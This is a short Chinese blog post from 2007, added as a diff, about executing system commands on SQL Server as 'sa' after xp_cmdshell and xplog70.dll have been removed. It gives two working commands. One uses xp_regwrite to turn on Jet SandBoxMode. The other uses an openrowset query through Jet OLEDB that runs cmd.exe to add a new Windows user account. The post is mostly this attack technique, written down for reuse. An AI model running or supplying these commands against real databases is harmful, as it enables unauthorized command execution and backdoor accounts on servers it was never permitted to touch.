@@ -1,0 +1,16 @@
+SA下不用恢复xp_cmdshell和xplog70.dll也执行命令
+2007年11月18日 Chinadu 发表评论 749 views 阅读评论 
+sa下删除xp_cmdshell和xplog70.dll时候的一种办法，不算新的了，
+也被一些人不断的再次提出来，
+为了方便自己记忆再写出来，
+在这种情况下，要执行命令，条件是要有xp_regwrite。
+
+首先开启沙盘模式： 
+
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+
+然后利用jet.oledb执行系统命令 
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net user cnfjhh fst /add")')
+
